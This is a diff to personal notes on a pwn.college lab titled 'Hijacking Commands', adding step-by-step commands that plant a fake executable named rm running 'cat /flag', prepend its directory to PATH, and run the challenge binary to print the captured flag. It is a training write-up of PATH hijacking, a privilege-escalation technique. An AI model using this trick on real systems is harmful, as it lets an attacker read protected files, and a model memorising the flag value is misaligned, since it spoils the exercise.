@@ -57,7 +57,14 @@ It looks like that did not work... Did you set PATH correctly?
 
 # Hijacking Commands
 - **To obtain the flag**:
-  1. 
+  1. Make a file called `rm` with the command `cat /flag` as before even without the challenge explicitly stating, I saved rm in /home/hacker
+  2. chmod +x rm
+  3. export PATH=/home/hacker:$PATH
+  4. rm gives cat: /flag: Permission denied
+  5. /challenge/run
+  > Trying to remove /flag...
+    Found 'rm' command at /home/hacker/rm. Executing!
+    pwn.college{sEkbwTZtmCjnPnG6fLmiUNMKfD6.ddzNyUDLxIDM2czW}
 
 ---
 
